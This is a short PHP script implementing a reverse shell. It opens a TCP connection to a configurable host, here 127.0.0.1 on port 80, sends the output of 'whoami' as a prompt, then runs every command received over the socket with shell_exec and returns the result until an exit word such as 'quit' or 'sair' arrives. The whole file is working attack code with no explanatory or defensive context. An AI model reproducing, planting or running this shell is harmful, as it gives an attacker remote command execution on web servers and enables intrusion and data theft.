<?php
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!socket_connect($socket, '127.0.0.1', 80))
    {
      echo socket_strerror(socket_last_error());
    } else
    {
      $bool = true;
      while ($bool)
      {
        socket_write($socket, "PHP Shell ".shell_exec("whoami"). " > ");
        $cmd = trim(socket_read($socket, 4096));
        socket_write($socket, shell_exec($cmd));

        $exit = ["Sair", "sair", "Quit", "quit", "leave", "Leave", "Exit", "exit"];
        foreach ($exit as $key => $value)
        {
          if ($cmd == $value)
          {
            $bool = false;
          }
        }
      }
      if (!$bool)
        socket_close($socket);
    }
    ?>
    